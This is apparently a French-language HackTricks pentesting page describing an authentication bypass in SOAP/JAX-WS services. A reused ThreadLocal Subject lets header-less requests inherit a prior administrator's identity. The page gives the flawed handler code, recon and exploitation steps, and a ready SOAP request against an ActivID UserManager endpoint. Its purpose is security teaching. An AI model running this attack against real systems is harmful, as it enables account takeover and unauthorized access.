# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- Certaines chaînes middleware stockent le `Subject`/`Principal` authentifié dans un `ThreadLocal` statique et ne le rafraîchissent que lorsqu'un en-tête SOAP propriétaire est présent.
- Comme WebLogic/JBoss/GlassFish recyclent les threads de travail, l'absence de cet en-tête fait réutiliser silencieusement le dernier `Subject` privilégié traité par le thread.
- Inondez l'endpoint vulnérable avec des corps SOAP bien formés mais sans en-tête jusqu'à ce qu'un thread réutilisé vous accorde le contexte d'administrateur volé.

## Cause sous-jacente

Handlers similaires au suivant écrasent l'identité thread-local uniquement lorsque l'en-tête personnalisé est présent, donc le contexte de la requête précédente persiste:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Recon

1. Énumérez les règles de reverse proxy / routage pour localiser des arbres SOAP cachés qui peuvent bloquer `?wsdl` tout en acceptant des POSTs (cartographiez-les parallèlement au flux dans [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md)).
2. Décompressez les artefacts EAR/WAR/EJB (`unzip *.ear`) et inspectez `application.xml`, `web.xml`, les annotations `@WebService` et les handler chains (p.ex., `LoginHandlerChain.xml`) pour découvrir la classe handler, le QName d'en-tête SOAP et les noms des EJB sous-jacents.
3. Si les métadonnées sont manquantes, brute-forcez les chemins probables `ServiceName?wsdl` ou détendez temporairement les proxies de laboratoire, puis importez tout WSDL récupéré dans des outils tels que [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) pour générer des enveloppes de base.
4. Passez en revue le code des handlers pour repérer des objets `ThreadLocal` (p.ex., `SubjectHolder.setSubject()`) qui ne sont jamais réinitialisés lorsque l'en-tête d'authentification est absent ou malformé.

## Exploitation

1. Envoyez une requête valide **avec** l'en-tête propriétaire pour connaître les codes de réponse normaux et toute erreur utilisée pour les tokens invalides.
2. Renvoyez le même corps SOAP en omettant l'en-tête. Veillez à ce que le XML soit bien formé et à respecter les namespaces requis afin que le handler se termine proprement.
3. Bouclez la requête ; lorsqu'elle tombe sur un thread ayant précédemment exécuté une action privilégiée, le `Subject` réutilisé débloque des opérations protégées telles que les gestionnaires d'utilisateurs ou de credentials.
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## Validation du bug

- Attachez JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) ou des hooks de débogage similaires pour observer le contenu de `ThreadLocal` avant et après chaque appel, en confirmant qu'une requête non authentifiée a hérité d'un `Subject` administrateur antérieur.

## Références

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
